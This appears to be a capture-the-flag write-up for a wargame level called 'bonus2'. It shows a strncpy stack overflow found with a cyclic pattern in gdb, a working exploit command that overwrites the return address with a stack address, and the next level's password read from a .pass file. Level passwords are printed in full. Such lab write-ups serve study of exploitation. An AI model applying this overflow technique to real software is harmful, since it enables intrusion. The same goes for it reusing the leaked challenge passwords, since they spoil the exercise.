# Bonus 2

`su bonus2 #579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`

## Steps

We have abinary that takes 2 arguments a name, and somthing else.
This uses strncpy again, we think we can reproduce the overflow using no \0. It will copy 40 chars of the first argument.
Lets try that

```bash
$ ./bonus2 0123456789012345678901234567890123456789 dd
Hyvää päivää 0123456789012345678901234567890123456789dd // Should only print the numbers
```

Let's try with an overflow
```bash
(gdb) r 0123456789012345678901234567890123456789 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
```

We just have to replace at the index
```bash
./bonus2 0123456789012345678901234567890123456789 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5' + '\xbf\xff\xf8\xaf'[::-1] + 'a7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'")

$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```


